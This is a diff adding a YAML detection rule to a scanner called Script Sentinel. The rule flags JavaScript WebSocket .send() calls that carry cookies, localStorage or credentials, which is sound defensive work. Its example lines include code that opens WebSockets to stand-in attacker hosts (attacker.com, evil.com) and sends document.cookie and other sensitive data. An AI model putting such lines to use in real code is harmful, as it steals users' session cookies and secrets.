@@ -1,0 +1,41 @@
+# JavaScript Pattern: WebSocket Data Exfiltration
+# Detects WebSocket usage for potential data exfiltration
+
+id: JS-007
+name: WebSocket Data Exfiltration
+description: |
+  Detects WebSocket send operations combined with sensitive data access.
+  Plain WebSocket instantiation is very common in legitimate real-time apps.
+  Pattern focuses on .send() calls that include document/storage/cookie data,
+  which indicates potential data exfiltration rather than normal WebSocket use.
+languages:
+  - javascript
+detection_type: regex
+# Only match WebSocket.send with sensitive data - not plain new WebSocket()
+# new WebSocket alone is too common in chat apps, real-time dashboards, etc.
+detection_logic: '\.send\s*\(.*(?:document\.cookie|localStorage|sessionStorage|\.innerHTML|\.value)|WebSocket.*\.send\s*\(.*(?:password|token|credential|secret)'
+severity: Medium
+mitre_technique: T1041
+confidence: 0.75
+category: exfiltration
+enabled: true
+paranoia_levels:
+  - 1
+  - 2
+  - 3
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-17"
+  updated: "2025-11-17"
+  references:
+    - "https://attack.mitre.org/techniques/T1041/"
+    - "https://developer.mozilla.org/en-US/docs/Web/API/WebSocket"
+  tags:
+    - javascript
+    - websocket
+    - exfiltration
+    - c2
+  examples:
+    - "var ws = new WebSocket('wss://attacker.com'); ws.send(document.cookie);"
+    - "socket.send(JSON.stringify(localStorage));"
+    - "const ws = new WebSocket('ws://evil.com:8080'); ws.send(sensitiveData);"
